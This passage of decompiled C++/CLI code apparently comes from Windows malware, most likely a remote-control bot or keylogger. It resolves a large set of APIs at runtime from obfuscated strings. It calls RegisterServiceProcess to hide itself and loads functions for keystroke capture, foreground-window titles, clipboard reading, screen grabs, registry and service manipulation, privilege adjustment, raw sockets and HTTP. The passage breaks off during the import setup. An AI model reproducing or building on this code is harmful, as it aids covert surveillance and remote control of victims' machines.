      \u003CModule\u003E.fGetDriveType = (__FnPtr<uint (char*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D8);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSearchPath = (__FnPtr<uint (char*, char*, char*, uint, char*, char**)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D9);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fQueryPerformanceCounter = (__FnPtr<int (_LARGE_INTEGER*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D10);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fQueryPerformanceFrequency = (__FnPtr<int (_LARGE_INTEGER*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D11);
      if (\u003CModule\u003E.fSetErrorMode == null || \u003CModule\u003E.fCreateToolhelp32Snapshot == null || \u003CModule\u003E.fProcess32First == null || \u003CModule\u003E.fProcess32Next == null || \u003CModule\u003E.fGetDiskFreeSpaceEx == null || \u003CModule\u003E.fGetLogicalDriveStrings == null || \u003CModule\u003E.fGetDriveType == null || \u003CModule\u003E.fSearchPath == null || \u003CModule\u003E.fQueryPerformanceCounter == null || \u003CModule\u003E.fQueryPerformanceFrequency == null)
        \u003CModule\u003E.nokernel32 = 1;
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegisterServiceProcess = (__FnPtr<uint (uint, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D12);
      if (\u003CModule\u003E.fRegisterServiceProcess != null)
      {
        // ISSUE: function pointer call
        int num = (int) __calli(\u003CModule\u003E.fRegisterServiceProcess)(0U, 1U);
      }
    }
    else
    {
      \u003CModule\u003E.nokernel32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nokernel32 = 1;
    }
    HINSTANCE__* hinstancePtr1 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D13);
    if ((IntPtr) hinstancePtr1 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSendMessage = (__FnPtr<int (HWND__*, uint, uint, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D14);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fFindWindow = (__FnPtr<HWND__* (char*, char*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D15);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fIsWindow = (__FnPtr<int (HWND__*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D16);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDestroyWindow = (__FnPtr<int (HWND__*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D17);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fOpenClipboard = (__FnPtr<int (HWND__*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D18);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetClipboardData = (__FnPtr<void* (uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D19);
      \u003CModule\u003E.fCloseClipboard = \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D20);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fExitWindowsEx = (__FnPtr<int (uint, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D21);
      if (\u003CModule\u003E.fSendMessage == null || \u003CModule\u003E.fFindWindow == null || \u003CModule\u003E.fIsWindow == null || \u003CModule\u003E.fDestroyWindow == null || \u003CModule\u003E.fOpenClipboard == null || \u003CModule\u003E.fGetClipboardData == null || \u003CModule\u003E.fCloseClipboard == null || \u003CModule\u003E.fExitWindowsEx == null)
        \u003CModule\u003E.nouser32 = 1;
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetAsyncKeyState = (__FnPtr<short (int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D22);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetKeyState = (__FnPtr<short (int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D23);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetWindowText = (__FnPtr<int (HWND__*, char*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D24);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetForegroundWindow = (__FnPtr<HWND__* ()>) \u003CModule\u003E.GetProcAddress(hinstancePtr1, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D25);
      if (\u003CModule\u003E.fGetAsyncKeyState == null || \u003CModule\u003E.fGetKeyState == null || \u003CModule\u003E.fGetWindowText == null || \u003CModule\u003E.fGetForegroundWindow == null)
        \u003CModule\u003E.nouser32 = 1;
    }
    else
    {
      \u003CModule\u003E.nouser32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nouser32 = 1;
    }
    HINSTANCE__* moduleHandleW2 = \u003CModule\u003E.GetModuleHandleW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D26);
    if ((IntPtr) moduleHandleW2 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegOpenKeyEx = (__FnPtr<int (HKEY__*, char*, uint, uint, HKEY__**)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D27);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegCreateKeyEx = (__FnPtr<int (HKEY__*, char*, uint, char*, uint, uint, _SECURITY_ATTRIBUTES*, HKEY__**, uint*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D28);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegSetValueEx = (__FnPtr<int (HKEY__*, char*, uint, uint, byte*, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D29);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegQueryValueEx = (__FnPtr<int (HKEY__*, char*, uint*, uint*, byte*, uint*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D30);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegDeleteValue = (__FnPtr<int (HKEY__*, char*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D31);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fRegCloseKey = (__FnPtr<int (HKEY__*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D32);
      if (\u003CModule\u003E.fRegOpenKeyEx == null || \u003CModule\u003E.fRegCreateKeyEx == null || \u003CModule\u003E.fRegSetValueEx == null || \u003CModule\u003E.fRegQueryValueEx == null || \u003CModule\u003E.fRegDeleteValue == null || \u003CModule\u003E.fRegCloseKey == null)
        \u003CModule\u003E.noadvapi32 = 1;
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fOpenProcessToken = (__FnPtr<int (void*, uint, void**)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D33);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fLookupPrivilegeValue = (__FnPtr<int (char*, char*, _LUID*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D34);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fAdjustTokenPrivileges = (__FnPtr<int (void*, int, _TOKEN_PRIVILEGES*, uint, _TOKEN_PRIVILEGES*, uint*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D35);
      if (\u003CModule\u003E.fOpenProcessToken == null || \u003CModule\u003E.fLookupPrivilegeValue == null || \u003CModule\u003E.fAdjustTokenPrivileges == null)
        \u003CModule\u003E.noadvapi32 = 1;
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fOpenSCManager = (__FnPtr<SC_HANDLE__* (char*, char*, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D36);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fOpenService = (__FnPtr<SC_HANDLE__* (SC_HANDLE__*, char*, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D37);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fStartService = (__FnPtr<int (SC_HANDLE__*, uint, char**)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D38);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fControlService = (__FnPtr<int (SC_HANDLE__*, uint, _SERVICE_STATUS*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D39);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDeleteService = (__FnPtr<int (SC_HANDLE__*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D40);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fCloseServiceHandle = (__FnPtr<int (SC_HANDLE__*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D41);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fEnumServicesStatus = (__FnPtr<int (SC_HANDLE__*, uint, uint, _ENUM_SERVICE_STATUSW*, uint, uint*, uint*, uint*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D42);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fIsValidSecurityDescriptor = (__FnPtr<int (void*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D43);
      if (\u003CModule\u003E.fOpenSCManager == null || \u003CModule\u003E.fOpenService == null || \u003CModule\u003E.fStartService == null || \u003CModule\u003E.fControlService == null || \u003CModule\u003E.fDeleteService == null || \u003CModule\u003E.fCloseServiceHandle == null || \u003CModule\u003E.fEnumServicesStatus == null || \u003CModule\u003E.fIsValidSecurityDescriptor == null)
        \u003CModule\u003E.noadvapi32 = 1;
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetUserName = (__FnPtr<int (char*, uint*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D44);
      if (\u003CModule\u003E.fGetUserName == null)
        \u003CModule\u003E.noadvapi32 = 1;
    }
    else
    {
      \u003CModule\u003E.noadvapi32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.noadvapi32 = 1;
    }
    HINSTANCE__* moduleHandleW3 = \u003CModule\u003E.GetModuleHandleW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D45);
    if ((IntPtr) moduleHandleW3 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fCreateDC = (__FnPtr<HDC__* (char*, char*, char*, _devicemodeW*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D46);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fCreateDIBSection = (__FnPtr<HBITMAP__* (HDC__*, tagBITMAPINFO*, uint, void**, void*, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D47);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fCreateCompatibleDC = (__FnPtr<HDC__* (HDC__*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D48);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetDeviceCaps = (__FnPtr<int (HDC__*, int)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D49);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fGetDIBColorTable = (__FnPtr<uint (HDC__*, uint, uint, tagRGBQUAD*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D50);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fSelectObject = (__FnPtr<void* (HDC__*, void*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D51);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fBitBlt = (__FnPtr<int (HDC__*, int, int, int, int, HDC__*, int, int, uint)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D52);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDeleteDC = (__FnPtr<int (HDC__*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D53);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fDeleteObject = (__FnPtr<int (void*)>) \u003CModule\u003E.GetProcAddress(moduleHandleW3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D54);
      if (\u003CModule\u003E.fCreateDC == null || \u003CModule\u003E.fCreateDIBSection == null || \u003CModule\u003E.fCreateCompatibleDC == null || \u003CModule\u003E.fGetDeviceCaps == null || \u003CModule\u003E.fGetDIBColorTable == null || \u003CModule\u003E.fSelectObject == null || \u003CModule\u003E.fBitBlt == null || \u003CModule\u003E.fDeleteDC == null || \u003CModule\u003E.fDeleteObject == null)
        \u003CModule\u003E.nogdi32 = 1;
    }
    else
    {
      \u003CModule\u003E.nogdi32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nogdi32 = 1;
    }
    HINSTANCE__* hinstancePtr2 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D55);
    if ((IntPtr) hinstancePtr2 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWSAStartup = (__FnPtr<int (ushort, WSAData*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D56);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWSASocket = (__FnPtr<uint (int, int, int, _WSAPROTOCOL_INFOW*, uint, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D57);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWSAAsyncSelect = (__FnPtr<int (uint, HWND__*, uint, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D58);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.__fWSAFDIsSet = (__FnPtr<int (uint, fd_set*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D59);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fWSAIoctl = (__FnPtr<int (uint, uint, void*, uint, void*, uint, uint*, _OVERLAPPED*, __FnPtr<void (uint, uint, _OVERLAPPED*, uint)>)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D60);
      \u003CModule\u003E.fWSAGetLastError = \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D61);
      \u003CModule\u003E.fWSACleanup = \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D62);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fsocket = (__FnPtr<uint (int, int, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D63);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fioctlsocket = (__FnPtr<int (uint, int, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D64);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fconnect = (__FnPtr<int (uint, sockaddr*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D65);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.finet_ntoa = (__FnPtr<sbyte* (in_addr)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D66);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.finet_addr = (__FnPtr<uint (sbyte*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D67);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fhtons = (__FnPtr<ushort (ushort)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D68);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fhtonl = (__FnPtr<uint (uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D69);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fntohs = (__FnPtr<ushort (ushort)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D70);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fntohl = (__FnPtr<uint (uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D71);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fsend = (__FnPtr<int (uint, sbyte*, int, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D72);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fsendto = (__FnPtr<int (uint, sbyte*, int, int, sockaddr*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D73);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.frecv = (__FnPtr<int (uint, sbyte*, int, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D74);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.frecvfrom = (__FnPtr<int (uint, sbyte*, int, int, sockaddr*, int*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D75);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fbind = (__FnPtr<int (uint, sockaddr*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D76);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fselect = (__FnPtr<int (int, fd_set*, fd_set*, fd_set*, timeval*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D77);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.flisten = (__FnPtr<int (uint, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D78);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.faccept = (__FnPtr<uint (uint, sockaddr*, int*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D79);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fsetsockopt = (__FnPtr<int (uint, int, int, sbyte*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D80);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fgetsockname = (__FnPtr<int (uint, sockaddr*, int*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D81);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fgethostname = (__FnPtr<int (sbyte*, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D82);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fgethostbyname = (__FnPtr<hostent* (sbyte*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D83);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fgethostbyaddr = (__FnPtr<hostent* (sbyte*, int, int)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D84);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fgetpeername = (__FnPtr<int (uint, sockaddr*, int*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D85);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fclosesocket = (__FnPtr<int (uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr2, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D86);
      if (\u003CModule\u003E.fWSAStartup == null || \u003CModule\u003E.fWSASocket == null || \u003CModule\u003E.fWSAAsyncSelect == null || \u003CModule\u003E.fWSAIoctl == null || \u003CModule\u003E.fWSAGetLastError == null || \u003CModule\u003E.fWSACleanup == null || \u003CModule\u003E.fsocket == null || \u003CModule\u003E.fioctlsocket == null || \u003CModule\u003E.fconnect == null || \u003CModule\u003E.finet_ntoa == null || \u003CModule\u003E.finet_addr == null || \u003CModule\u003E.fhtons == null || \u003CModule\u003E.fhtonl == null || \u003CModule\u003E.fntohs == null || \u003CModule\u003E.fsend == null || \u003CModule\u003E.fsendto == null || \u003CModule\u003E.frecv == null || \u003CModule\u003E.frecvfrom == null || \u003CModule\u003E.fbind == null || \u003CModule\u003E.fselect == null || \u003CModule\u003E.flisten == null || \u003CModule\u003E.faccept == null || \u003CModule\u003E.fsetsockopt == null || \u003CModule\u003E.fgetsockname == null || \u003CModule\u003E.fgethostname == null || \u003CModule\u003E.fgethostbyname == null || \u003CModule\u003E.fgethostbyaddr == null || \u003CModule\u003E.fclosesocket == null)
        \u003CModule\u003E.nows2_32 = 1;
    }
    else
    {
      \u003CModule\u003E.nows2_32err = \u003CModule\u003E.GetLastError();
      \u003CModule\u003E.nows2_32 = 1;
    }
    HINSTANCE__* hinstancePtr3 = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D87);
    if ((IntPtr) hinstancePtr3 != IntPtr.Zero)
    {
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetGetConnectedState = (__FnPtr<int (uint*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D88);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetGetConnectedStateEx = (__FnPtr<int (uint*, char*, uint, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D89);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fHttpOpenRequest = (__FnPtr<void* (void*, char*, char*, char*, char*, char**, uint, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D90);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fHttpSendRequest = (__FnPtr<int (void*, char*, uint, void*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D91);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetConnect = (__FnPtr<void* (void*, char*, ushort, char*, char*, uint, uint, uint*)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D92);
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.fInternetOpen = (__FnPtr<void* (char*, uint, char*, char*, uint)>) \u003CModule\u003E.GetProcAddress(hinstancePtr3, (sbyte*) &\u003CModule\u003E.\u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D93);
      // ISSUE: cast to a function pointer type
